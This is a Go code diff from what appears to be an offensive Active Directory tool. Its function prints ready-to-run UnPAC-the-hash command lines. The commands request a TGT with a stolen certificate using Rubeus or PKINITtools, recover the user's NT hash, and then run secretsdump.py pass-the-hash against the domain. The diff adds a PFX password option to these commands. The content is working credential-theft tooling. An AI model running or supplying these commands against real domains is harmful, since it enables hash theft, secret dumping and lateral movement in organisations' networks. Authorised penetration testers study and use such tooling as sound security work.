@@ -8,7 +8,7 @@ import (
 // PrintUnPACCommands prints commands to recover an NT hash from a PKINIT-obtained TGT.
 // UnPAC-the-hash exploits the U2U (User-to-User) Kerberos extension to extract
 // the encrypted PAC from a TGT, revealing the user's NT hash.
-func PrintUnPACCommands(pfxPath, dc, domain, upn string) {
+func PrintUnPACCommands(pfxPath, pfxPass, dc, domain, upn string) {
 	user := upn
 	if idx := strings.Index(user, "@"); idx > 0 {
 		user = user[:idx]
@@ -22,12 +22,16 @@ func PrintUnPACCommands(pfxPath, dc, domain, upn string) {
 	fmt.Println("    # Look for 'Got hash' in output")
 
 	fmt.Println("    # Rubeus (Windows — requests TGT + extracts credentials)")
-	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s /getcredentials /show /nowrap\n", user, pfxPath)
+	rubeusCmd := fmt.Sprintf("Rubeus.exe asktgt /user:%s /certificate:%s /getcredentials /show /nowrap", user, pfxPath)
+	if pfxPass != "" {
+		rubeusCmd += fmt.Sprintf(" /password:%s", pfxPass)
+	}
+	fmt.Printf("    %s\n", rubeusCmd)
 	fmt.Println("    # Look for 'NTLM' hash in credential info")
 
 	fmt.Println("    # PKINITtools (Python)")
-	fmt.Printf("    python gettgtpkinit.py -cert-pfx %s -pfx-pass '' %s/%s %s.ccache\n", pfxPath, domain, user, user)
-	fmt.Printf("    python getnthash.py -key <AS-REP-key> %s/%s\n\n", domain, user)
+	fmt.Printf("    python gettgtpkinit.py %s/%s %s.ccache -cert-pfx %s -pfx-pass '%s'\n", domain, user, user, pfxPath, pfxPass)
+	fmt.Printf("    python getnthash.py %s/%s -key <AS-REP-key>\n\n", domain, user)
 
 	fmt.Println("    # After obtaining NT hash, pass-the-hash:")
 	fmt.Printf("    secretsdump.py -hashes :<NTHASH> %s/%s@%s\n", domain, user, domain)
